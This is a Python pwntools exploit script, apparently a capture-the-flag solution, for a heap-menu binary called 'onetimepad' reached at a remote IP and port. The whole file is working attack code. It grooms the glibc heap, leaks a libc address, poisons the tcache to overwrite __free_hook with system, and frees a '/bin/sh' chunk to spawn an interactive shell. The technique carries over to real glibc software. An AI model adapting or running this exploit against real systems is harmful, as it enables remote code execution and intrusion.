from pwn import *

context.log_level = 'debug'

def menu(p, choice):
    p.recvuntil('> ')
    p.sendline(choice)

def read(p, idx):
    menu(p, 'r')
    p.sendline(str(idx))
    return p.recvline()

def write(p, data):
    menu(p, 'w')
    p.sendline(data)

def rewrite(p, idx, data):
    menu(p, 'e')
    p.sendline(str(idx))
    p.sendline(data)

DEBUG = False
if DEBUG:
    binary = ELF('./onetimepad')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
    p = process('./onetimepad')
else:
    binary = ELF('./onetimepad')
    libc = ELF('../../glibc/2.28_debian/libs/libc-2.28.so')
    p = remote('88.198.154.140', 31336)
    #p = process(['../../glibc/2.28_debian/ld-2.28.so', './onetimepad'], env={'LD_LIBRARY_PATH': '../../glibc/2.28_debian/libs'})


write(p, "A"*0x890)  # idx 0, getline pre-allocator

write(p, "B"*0x17)  # idx 1 (+0x1a10)
write(p, "C"*0x17)  # idx 2 (+0x1a30)
write(p, "D"*0x17)  # idx 3 (+0x1a50)
write(p, "E"*0x377)  # idx 4 (consolidation check)
write(p, "F"*0x17)  # idx 5
write(p, "G"*0x17)  # idx 6

write(p, "H"*0x17)  # idx 7
read(p, 7)
write(p, "H"*0x27)  # idx 7

read(p, 5)
write(p, "I"*0x77)  # idx 5, split remainder
read(p, 5)

read(p, 3)
read(p, 2)  # tcache 0x1a30 -> 0x1a50

rewrite(p, 2, "")  # tcache 0x1a30 -> 0x1a00
write(p, "J"*0x17)  # idx 2 (+0x1a30)
write(p, "K"*0x8 + p64(0x471))  # idx 3 (+0x1a00)

read(p, 6)  # tcache size 0x20

read(p, 1)
write(p, "L"*0x3d7)
read(p, 1)

write(p, "M"*0x27)  # index 1 (+0x1df0)

write(p, "N"*0x27)

arena_leak = read(p, 7)[-7:-1]
assert len(arena_leak) == 6
arena_leak = u64(arena_leak.ljust(8, '\x00'))
libc_leak = arena_leak - libc.symbols['__free_hook'] + 0x1c48
print("libc leak: 0x{:016x}".format(libc_leak))
assert libc_leak & 0xfff == 0

libc_free_hook = libc_leak + libc.symbols['__free_hook']
libc_system = libc_leak + libc.symbols['system'] + 0x10  # say no to NULL bytes
print("system: 0x{:016x}".format(libc_system))

read(p, 1)  # free index 1
write(p, "O"*0x20 + p64(libc_free_hook))  # poison tcache size 0x20 list
read(p, 1)  # free index 1

write(p, "/bin/sh")  # index 1
write(p, p64(libc_system))  # index 6 (__free_hook)

#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(p)

read(p, 1)

p.interactive()